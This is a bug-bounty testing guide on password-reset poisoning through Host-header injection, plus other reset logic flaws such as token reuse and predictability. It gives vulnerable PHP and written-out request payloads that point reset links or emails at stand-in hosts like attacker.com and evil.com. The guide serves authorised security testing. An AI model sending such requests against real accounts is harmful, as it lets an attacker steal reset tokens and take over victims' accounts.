# Password Reset Poisoning & Logic Issues

## Password reset poisoning (Host header injection)

This is one of the most consistently rewarded "simple" authentication bugs in bug bounty, because password-reset emails very often build their link using whatever the server thinks its own hostname is — and that's frequently taken straight from the attacker-controlled `Host` header.

**Why it works:** server-side code like
```php
$reset_link = "https://" . $_SERVER['HTTP_HOST'] . "/reset?token=" . $token;
mail($user_email, "Reset your password", $reset_link);
```
trusts the `Host` header to build an absolute URL, with no validation that it matches the real domain.

**Test:**
```
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```
If the application is vulnerable, the email sent to `victim@target.com` contains a reset link pointing at `attacker.com/reset?token=...`. When the victim clicks it (in a real attack), the token is delivered straight to a server the attacker controls. If you can trigger a reset to your own test account/inbox, you can verify this end-to-end yourself and capture the real email content as proof.

**Variants to try if the plain `Host` header is properly validated:**
```
X-Forwarded-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Host: attacker.com
Forwarded: host=attacker.com
```
Some apps validate `Host` strictly (matching it against an allowlist) but still trust one of these alternate headers when building absolute URLs, because they were added later for proxy support and never got the same validation.

**Confirming, not just observing:** getting the request accepted with a foreign `Host` value is not enough — you need the actual email content (or an out-of-band callback hit on a domain you control, via interactsh/Burp Collaborator if you can't access the inbox directly) showing the poisoned link was generated and sent.

## Other password-reset logic issues

```
# Second email parameter — does validation check the first instance while
# the actual reset email gets sent to the last?
POST /forgot-password
email=victim@target.com&email=attacker@evil.com
```

- **Token predictability** — collect several reset tokens in a row; check for sequential or timestamp-derived patterns rather than high-entropy random values.
- **Token reuse** — use the same reset token twice; a properly implemented flow invalidates it after first use.
- **Token leakage via Referer** — if the token sits in the URL query string and the reset page loads any third-party resource (analytics, fonts, ads), check whether the token leaks to that third party via the `Referer` header.
- **No re-authentication on the reset-completion step** — confirm whether setting a new password actually requires the (now-used) token to still be valid, versus the session merely "remembering" that a token was checked earlier in a way that can be replayed independently.

## What makes a password-reset finding confirmed, not theoretical

The actual poisoned email content, or an out-of-band callback proving the link was generated with an attacker-controlled host — not just "the Host header was reflected somewhere in the response." For token issues: an actual completed password reset performed on a test account using the predicted/reused/leaked token.

For OAuth/SSO login as a reset alternative, see `oauth-testing.md`.
